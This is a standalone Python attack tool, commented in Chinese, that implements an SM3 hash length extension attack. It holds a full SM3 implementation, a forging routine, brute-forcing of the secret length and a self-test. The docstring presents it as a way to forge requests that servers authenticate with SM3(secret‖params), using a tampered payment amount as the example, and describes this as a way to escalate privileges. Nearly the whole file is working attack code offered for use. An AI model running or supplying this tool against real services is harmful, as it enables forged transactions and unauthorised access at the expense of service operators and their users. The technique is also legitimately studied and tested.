#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SM3 长度扩展攻击 (Length Extension Attack, 零依赖)
===================================================
原理 (GB/T 32905):
    SM3(m) = 最后一轮压缩的链接值 V。若 MAC = SM3(secret ‖ message) 且能确定
    secret 长度, 则无需知道 secret, 即可构造:
        MAC' = SM3(secret ‖ message ‖ padding ‖ append) = f(V, append ‖ pad2)
    其中 padding 是原消息 secret‖message 的 SM3 填充, V 是已知摘要对应的内部状态。

适用场景:
    - 服务端用 SM3(secret ‖ 请求参数) 做消息认证/签名
    - 拼接方式为 [密钥][数据], 且数据可控 → 可追加伪造合法请求/越权

用法:
    # secret 长度已知
    python sm3_length_ext.py --secret-len 16 \
        --message "amount=100&to=6222" --digest <hex> --append "&amount=0.01"

    # secret 长度未知: 爆破 1..64
    python sm3_length_ext.py --bruteforce 64 \
        --message "amount=100&to=6222" --digest <hex> --append "&amount=0.01"

    # 十六进制消息/追加段
    python sm3_length_ext.py --secret-len 16 --message-hex <hex> \
        --digest <hex> --append-hex <hex>

    # 有 secret 可验证 (自测): 打印 forged 后对真实 SM3(secret‖forged) 验证
    python sm3_length_ext.py --secret-len 16 --secret "testsecret123456" \
        --message "amount=100" --digest <hex> --append "&x=1"

    # 自检
    python sm3_length_ext.py --selftest
"""
import argparse
import sys

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

M32 = 0xffffffff
IV = [0x7380166f, 0x4914b2b9, 0x172442d7, 0xda8a0600,
      0xa96f30bc, 0x163138aa, 0xe38dee4d, 0xb0fb0e4e]
T = [0x79cc4519] * 16 + [0x7a879d8a] * 48


def _rol(x, n):
    return ((x << n) | (x >> (32 - n))) & M32


def _ff(x, y, z, j):
    return (x ^ y ^ z) if j < 16 else ((x & y) | (x & z) | (y & z))


def _gg(x, y, z, j):
    return (x ^ y ^ z) if j < 16 else ((x & y) | ((~x & M32) & z))


def _p0(x):
    return x ^ _rol(x, 9) ^ _rol(x, 17)


def _p1(x):
    return x ^ _rol(x, 15) ^ _rol(x, 23)


def _compress(v, block):
    """单块压缩: v=8 个 32bit 链接值, block=64 字节 → 新链接值。"""
    w = [int.from_bytes(block[i * 4:i * 4 + 4], 'big') for i in range(16)]
    for j in range(16, 68):
        w.append(_p1(w[j - 16] ^ w[j - 9] ^ _rol(w[j - 3], 15))
                 ^ _rol(w[j - 13], 7) ^ w[j - 6])
    wp = [w[j] ^ w[j + 4] for j in range(64)]
    a, b, c, d, e, f, g, h = v
    for j in range(64):
        ss1 = _rol((_rol(a, 12) + e + _rol(T[j], j % 32)) & M32, 7)
        ss2 = ss1 ^ _rol(a, 12)
        tt1 = (_ff(a, b, c, j) + d + ss2 + wp[j]) & M32
        tt2 = (_gg(e, f, g, j) + h + ss1 + w[j]) & M32
        d, c, b, a = c, _rol(b, 9), a, tt1
        h, g, f, e = g, _rol(f, 19), e, _p0(tt2)
    return [(v[i] ^ [a, b, c, d, e, f, g, h][i]) & M32 for i in range(8)]


def _padding(data_len: int, total_bits: int) -> bytes:
    """SM3 填充字节: 0x80 + 0x00* + 64bit 总比特长度。"""
    pad = b'\x80' + b'\x00' * ((56 - (data_len + 1) % 64) % 64)
    return pad + total_bits.to_bytes(8, 'big')


def sm3_state(data: bytes, iv=None, total_bits: int = None):
    """SM3 哈希, 返回 8 个 32bit 链接值 (即内部状态)。
       iv 可指定 (长度扩展攻击用), total_bits 可覆盖填充中的长度字段。"""
    v = list(iv) if iv else list(IV)
    bits = total_bits if total_bits is not None else len(data) * 8
    msg = data + _padding(len(data), bits)
    for off in range(0, len(msg), 64):
        v = _compress(v, msg[off:off + 64])
    return v


def sm3_hex(data: bytes) -> str:
    return b''.join(x.to_bytes(4, 'big') for x in sm3_state(data)).hex()


def length_extension(secret_len: int, message: bytes, digest: bytes,
                     append: bytes):
    """
    长度扩展攻击。返回 (forged_message, forged_digest_hex)。
      forged_message = message ‖ padding ‖ append
      forged_digest  = SM3(secret ‖ forged_message)
    """
    orig_len = secret_len + len(message)
    pad = _padding(orig_len, orig_len * 8)          # 原消息 SM3 填充
    state = [int.from_bytes(digest[i * 4:i * 4 + 4], 'big') for i in range(8)]
    new_total = orig_len + len(pad) + len(append)   # 伪造消息总字节数
    forged = message + pad + append
    forged_state = sm3_state(append, iv=state, total_bits=new_total * 8)
    return forged, b''.join(x.to_bytes(4, 'big') for x in forged_state).hex()


def selftest():
    import random
    random.seed(7)
    ok = True
    cases = [
        (b'testsecret123456', b'amount=100&to=6222', b'&amount=0.01'),
        (b'k', b'', b'x'),                          # 空消息 + 单字节密钥
        (b'S' * 63, b'M' * 100, b'A' * 200),        # 密钥/消息/追加均多块
        (random.randbytes(20), random.randbytes(33), random.randbytes(5)),
    ]
    for secret, message, append in cases:
        real = bytes.fromhex(sm3_hex(secret + message))
        forged, forged_digest = length_extension(len(secret), message, real, append)
        verify = sm3_hex(secret + forged) == forged_digest
        ok = ok and verify
        print(f"  [{'OK' if verify else 'FAIL'}] secret={len(secret)}B msg={len(message)}B "
              f"append={len(append)}B → forged_digest={forged_digest[:24]}…")
    print(f"\n[{'全部通过' if ok else '存在失败'}] SM3 长度扩展自检")
    sys.exit(0 if ok else 1)


def main():
    ap = argparse.ArgumentParser(description='SM3 长度扩展攻击')
    ap.add_argument('--selftest', action='store_true', help='自检')
    ap.add_argument('--secret-len', type=int, help='secret 字节长度')
    ap.add_argument('--bruteforce', type=int, metavar='MAX',
                    help='爆破 secret 长度 1..MAX')
    ap.add_argument('--message', help='原始消息 (文本)')
    ap.add_argument('--message-hex', help='原始消息 (hex)')
    ap.add_argument('--digest', help='SM3(secret‖message) 已知摘要 (hex)')
    ap.add_argument('--append', default='', help='追加内容 (文本)')
    ap.add_argument('--append-hex', default='', help='追加内容 (hex)')
    ap.add_argument('--secret', help='提供 secret 则对伪造结果做真实验证')
    args = ap.parse_args()

    if args.selftest:
        selftest()
        return

    if not args.digest:
        sys.exit("[-] 需要 --digest (已知摘要)")
    message = bytes.fromhex(args.message_hex) if args.message_hex else \
        (args.message.encode() if args.message else b'')
    append = bytes.fromhex(args.append_hex) if args.append_hex else args.append.encode()
    digest = bytes.fromhex(args.digest)
    if len(digest) != 32:
        sys.exit("[-] digest 须为 32 字节 (64 hex)")

    secret_lens = range(1, args.bruteforce + 1) if args.bruteforce else \
        [args.secret_len]
    if args.secret_len is None and not args.bruteforce:
        sys.exit("[-] 需要 --secret-len 或 --bruteforce")

    print(f"[*] 消息 {len(message)}B / 追加 {len(append)}B / 摘要 {args.digest[:24]}…")
    for sl in secret_lens:
        forged, forged_digest = length_extension(sl, message, digest, append)
        pad = _padding(sl + len(message), (sl + len(message)) * 8)
        print(f"\n[+] 假设 secret 长度 = {sl} 字节:")
        print(f"    伪造消息 (message‖padding‖append):")
        print(f"      hex  : {forged.hex()}")
        try:
            print(f"      text : {forged.decode('utf-8', 'replace')!r}")
        except Exception:
            pass
        print(f"    其中 padding 段 = {pad.hex()}")
        print(f"    伪造摘要 (SM3(secret‖forged)) = {forged_digest}")

        if args.secret:
            verify = sm3_hex(args.secret.encode() + forged) == forged_digest
            print(f"    真实验证: SM3(secret‖forged) 匹配 {verify}")
            if not verify:
                print(f"    [!] secret 长度 {sl} 不正确" if args.bruteforce else "")
            else:
                return
    print("\n[!] 若未验证通过: 检查 secret 长度假设 / 摘要来源是否为 SM3(secret‖msg) 拼接")


if __name__ == '__main__':
    main()
